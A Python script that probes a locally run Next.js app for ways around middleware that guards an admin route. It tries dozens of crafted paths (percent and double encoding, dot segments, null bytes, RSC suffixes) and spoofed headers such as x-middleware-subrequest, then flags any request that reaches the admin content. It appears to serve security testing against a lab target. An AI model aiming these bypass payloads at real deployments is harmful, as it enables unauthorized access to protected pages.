#!/usr/bin/env python3
"""
Middleware bypass probe.

middleware.js protects `/admin/:path*` and returns 401 BLOCKED-BY-MIDDLEWARE
without the x-auth header.  app/admin/page.js renders ADMIN-SECRET-CONTENT.

A bypass is any request path that renders ADMIN-SECRET-CONTENT while the
middleware did NOT block it.  Send everything with --path-as-is so curl does
not normalise the path for us.
"""
import subprocess
import sys

BASE = "http://127.0.0.1:3000"

CASES = [
    ("baseline (should be blocked)", "/admin"),
    ("baseline sub  (blocked)", "/admin/x"),
    # single encoding -- matcher also tests the decoded form
    ("single-encoded a", "/%61dmin"),
    ("single-encoded full", "/%61%64%6d%69%6e"),
    # double encoding
    ("double-encoded a", "/%2561dmin"),
    ("double-encoded full", "/%2561%2564%256d%2569%256e"),
    # trailing / dot / slash games
    ("trailing slash", "/admin/"),
    ("trailing dot", "/admin/."),
    ("dot segment", "/./admin"),
    ("double slash", "//admin"),
    ("triple slash", "///admin"),
    ("parent then back", "/foo/../admin"),
    ("encoded dotdot", "/foo/%2e%2e/admin"),
    ("trailing %2f", "/admin%2f"),
    ("trailing encoded slash sub", "/admin%2fx"),
    # separator confusion
    ("backslash", "/admin\\"),
    ("encoded backslash", "/admin%5c"),
    ("leading backslash", "\\admin"),
    # case
    ("uppercase", "/ADMIN"),
    ("mixed case", "/Admin"),
    # semicolon / params
    ("semicolon", "/admin;foo"),
    ("encoded semicolon", "/admin%3bfoo"),
    # null / control
    ("null byte", "/admin%00"),
    ("newline", "/admin%0a"),
    ("tab", "/admin%09"),
    # unicode / overlong
    ("unicode fullwidth", "/%ef%bc%81admin"),
    ("overlong slash", "/%c0%afadmin"),
    # index / rsc suffixes
    ("index suffix", "/admin/index"),
    ("rsc query", "/admin?_rsc=1"),
    # next internals
    ("_next data-ish", "/_next/data/x/admin.json"),
    ("segment prefetch", "/admin.segments/_tree.segment.rsc"),
    ("rsc ext", "/admin.rsc"),
    ("txt ext", "/admin.txt"),
    ("html ext", "/admin.html"),
    ("prefetch rsc", "/admin.prefetch.rsc"),
]

HEADERS = [
    ("plain", []),
    ("RSC header", ["-H", "RSC: 1"]),
    ("x-middleware-subrequest", ["-H", "x-middleware-subrequest: middleware"]),
    ("x-middleware-subrequest chained",
     ["-H", "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"]),
    ("x-nextjs-data", ["-H", "x-nextjs-data: 1"]),
    ("x-invoke-path", ["-H", "x-invoke-path: /admin"]),
    ("x-middleware-override-headers",
     ["-H", "x-middleware-override-headers: x-auth", "-H", "x-middleware-request-x-auth: letmein"]),
]


def get(path, extra):
    r = subprocess.run(
        ["curl", "-s", "-i", "--path-as-is", *extra, BASE + path],
        capture_output=True, text=True, timeout=20)
    return r.stdout


def main():
    bypasses = []
    print(f"{'case':38s} {'header':32s} status  result")
    print("-" * 96)
    for cname, path in CASES:
        for hname, extra in HEADERS:
            if hname != "plain" and cname not in (
                    "baseline (should be blocked)", "baseline sub  (blocked)"):
                continue
            out = get(path, extra)
            status = out.split("\n", 1)[0].strip() if out else "(no response)"
            code = status.split(" ")[1] if " " in status else "?"
            leaked = "ADMIN-SECRET-CONTENT" in out
            blocked = "BLOCKED-BY-MIDDLEWARE" in out
            if leaked and not blocked:
                verdict = "*** BYPASS: admin content without middleware ***"
                bypasses.append((cname, hname, path, code))
            elif leaked:
                verdict = "leaked but middleware also ran (odd)"
            elif blocked:
                verdict = "blocked"
            else:
                verdict = "no admin content"
            print(f"{cname:38s} {hname:32s} {code:5s}  {verdict}")

    print()
    if bypasses:
        print("BYPASSES FOUND:")
        for c, h, p, code in bypasses:
            print(f"  {code}  {p!r}  ({c}; header={h})")
    else:
        print("No middleware bypass found in this battery.")
    return 1 if bypasses else 0


if __name__ == "__main__":
    sys.exit(main())
